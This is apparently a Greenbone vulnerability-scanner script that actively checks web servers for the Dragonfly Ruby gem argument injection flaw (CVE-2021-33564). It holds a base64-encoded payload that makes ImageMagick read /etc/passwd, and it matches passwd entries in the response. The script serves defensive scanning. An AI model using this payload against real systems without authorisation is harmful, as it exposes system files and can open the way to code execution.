if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.146048" );
	script_version( "2021-08-24T09:01:06+0000" );
	script_tag( name: "last_modification", value: "2021-08-24 09:01:06 +0000 (Tue, 24 Aug 2021)" );
	script_tag( name: "creation_date", value: "2021-06-01 05:13:21 +0000 (Tue, 01 Jun 2021)" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_tag( name: "severity_vector", value: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2021-06-10 15:20:00 +0000 (Thu, 10 Jun 2021)" );
	script_cve_id( "CVE-2021-33564" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Dragonfly Ruby Gem < 1.4.0 Argument Injection Vulnerability - Active Check" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2021 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc", "os_detection.sc" );
	script_mandatory_keys( "Host/runs_unixoide" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "Dragonfly Ruby Gem is prone to an argument injection vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "insight", value: "An argument injection vulnerability in the Dragonfly gem for
  Ruby allows remote attackers to read and write to arbitrary files via a crafted URL when the
  verify_url option is disabled. This may lead to code execution. The problem occurs because the
  generate and process features mishandle use of the ImageMagick convert utility." );
	script_tag( name: "affected", value: "Dragonfly Ruby Gem versions prior to 1.4.0." );
	script_tag( name: "solution", value: "Update to version 1.4.0 or later." );
	script_xref( name: "URL", value: "https://zxsecurity.co.nz/research/argunment-injection-ruby-dragonfly/" );
	script_xref( name: "URL", value: "https://github.com/markevans/dragonfly/issues/513" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
require("os_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	res = http_get_cache( port: port, item: dir );
	path = eregmatch( pattern: "(/system([^ ]+)?/images/)W1si", string: res );
	if(isnull( path[1] )){
		exit( 0 );
	}
	payload = "W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==";
	if(dir == "/"){
		dir = "";
	}
	url = dir + path[1] + payload;
	if(http_vuln_check( port: port, url: url, pattern: "(root|admin|nobody):[^:]*:[0-9]+:(-2|[0-9]+):([^:]*:){2}", check_header: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

